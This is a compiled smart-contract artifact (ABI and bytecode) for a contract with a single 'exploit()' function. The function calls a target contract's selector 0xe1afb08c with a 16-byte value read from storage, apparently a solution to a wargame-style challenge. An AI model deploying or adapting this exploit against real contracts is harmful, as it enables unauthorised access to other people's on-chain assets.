{"abi":[{"type":"constructor","inputs":[{"name":"target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161019d38038061019d833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b610117806100865f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c806363d9b77014602a575b5f5ffd5b60306032565b005b5f603b60075490565b5f546040517fe1afb08c0000000000000000000000000000000000000000000000000000000081527fffffffffffffffffffffffffffffffff0000000000000000000000000000000083166004820152919250829173ffffffffffffffffffffffffffffffffffffffff9091169063e1afb08c906024015f604051808303815f87803b15801560c8575f5ffd5b505af115801560d9573d5f5f3e3d5ffd5b50505050505056fea2646970667358221220f478195d8bf5c896491856da354a65070138aa2afdb0aa293d462d9292f53a3f64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit()":"63d9b770"},"id":0}